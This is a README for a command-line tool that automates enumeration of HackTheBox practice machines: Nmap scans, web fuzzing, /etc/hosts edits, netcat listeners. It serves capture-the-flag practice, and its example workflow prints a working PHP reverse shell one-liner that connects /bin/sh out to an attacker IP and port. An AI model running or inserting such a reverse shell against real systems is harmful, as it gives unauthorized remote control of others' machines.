# htb-scripts
Automation of htb scripts from LLM while solving htb machines

Below is the documentation for the script, detailing its usage, commands, and functionalities.

---

![image](https://github.com/user-attachments/assets/388076d4-a88a-4d57-a7a4-a87f1a080d5d)


# HTB Enumerator Tool Documentation

![image](https://github.com/user-attachments/assets/1aa3532d-9ad0-43b1-b37e-4c86c7fa87d8)


## Overview

The HTB Enumerator Tool is a modular and interactive command-line interface (CLI) designed to assist in the enumeration of HackTheBox (HTB) machines. It provides various functionalities such as running Nmap scans, updating `/etc/hosts`, starting web servers, and more. The tool supports command auto-completion and command history for a user-friendly experience.

## Installation

### Prerequisites

- Python 3.x
- `termcolor` module: Install via `pip install termcolor`
- `readline` module: Typically included with Python on Unix-like systems

### Required Tools

The script checks for and installs the following tools if they are not already present:
- `nmap`
- `gobuster`
- `ffuf`
- `whatweb`

## Usage

### Running the Script

To run the script, use the following command:

```bash
sudo python3 htb_enum.py
```

**Note**: The script must be run with root privileges (`sudo`) to update `/etc/hosts`.

### Interactive CLI

Once the script is running, you will be presented with a prompt:

```
htb_enum >
```

You can enter various commands to perform different tasks. The available commands are listed below.

### Commands

#### `nmap`

Sets the IP address for the target machine.

```
htb_enum > nmap
Set IP: <IP_ADDRESS>
```

#### `run`

Runs an Nmap scan on the set IP address.

```
htb_enum > run
```

#### `host`

Sets the hostname for the target machine and updates `/etc/hosts`.

```
htb_enum > host
Set Hostname: <HOSTNAME>
```

#### `check_ports`

Checks for open web ports (80, 443, 8080, 5000) from the Nmap scan results.

```
htb_enum > check_ports
```

#### `enumerate_web`

Enumerates web servers on the open ports found.

```
htb_enum > enumerate_web
```

#### `start_server`

Starts a Python3 web server on a specified port.

```
htb_enum > start_server
Enter port for Python3 web server: <PORT>
```

#### `nc_listener`

Starts a Netcat listener on a specified port.

```
htb_enum > nc_listener
Enter port for nc listener: <PORT>
```

#### `php_shell`

Generates a PHP reverse shell command for a specified IP and port.

```
htb_enum > php_shell
Enter your IP for reverse shell: <YOUR_IP>
Enter your port for reverse shell: <YOUR_PORT>
```

#### `exit`

Exits the tool.

```
htb_enum > exit
```

### Auto-completion and Command History

- **Auto-completion**: Press the `Tab` key to auto-complete commands.
- **Command History**: Use the `Up` and `Down` arrow keys to navigate through previously entered commands.

## Example Workflow

1. **Set IP Address**:
   ```
   htb_enum > nmap
   Set IP: 10.10.10.10
   IP is set to 10.10.10.10
   ```

2. **Run Nmap Scan**:
   ```
   htb_enum > run
   Running Nmap scan... 🔍
   Nmap scan completed. Results saved in nmap_scan.txt ✅
   ```

3. **Set Hostname and Update `/etc/hosts`**:
   ```
   htb_enum > host
   Set Hostname: target
   Hostname is set to target
   Updating /etc/hosts... 🛠️
   Added 10.10.10.10    target.htb to /etc/hosts ✅
   ```

4. **Check Open Web Ports**:
   ```
   htb_enum > check_ports
   Open web ports: [80, 443]
   ```

5. **Enumerate Web Servers**:
   ```
   htb_enum > enumerate_web
   Enumerating web server on port 80... 🌐
   ...
   Enumerating web server on port 443... 🌐
   ...
   ```

6. **Start Python3 Web Server**:
   ```
   htb_enum > start_server
   Enter port for Python3 web server: 8000
   Starting Python3 web server on port 8000... 🌐
   ```

7. **Start Netcat Listener**:
   ```
   htb_enum > nc_listener
   Enter port for nc listener: 4444
   Starting nc listener on port 4444... 📡
   ```

8. **Generate PHP Reverse Shell Command**:
   ```
   htb_enum > php_shell
   Enter your IP for reverse shell: 192.168.1.100
   Enter your port for reverse shell: 4444
   PHP reverse shell command: php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```

## Error Handling

- **EOFError**: If you accidentally press `Ctrl+D`, the script will prompt you to use the `exit` command to quit.
- **KeyboardInterrupt**: If you press `Ctrl+C`, the script will remind you to use the `exit` command to quit.

## Exiting the Tool

To exit the tool, simply type:

```
htb_enum > exit
```

## Saving Command History

The command history is saved to `~/.htb_enum_history` and is loaded when the tool starts. This allows you to navigate through previous commands using the arrow keys.

## Conclusion

The HTB Enumerator Tool is designed to streamline the enumeration process for HackTheBox machines, providing a modular and interactive interface. With command auto-completion, history navigation, and a variety of built-in functionalities, it aims to enhance the efficiency and effectiveness of your enumeration tasks.

---

Feel free to customize and extend the tool as needed to fit your specific requirements. Happy enumerating!
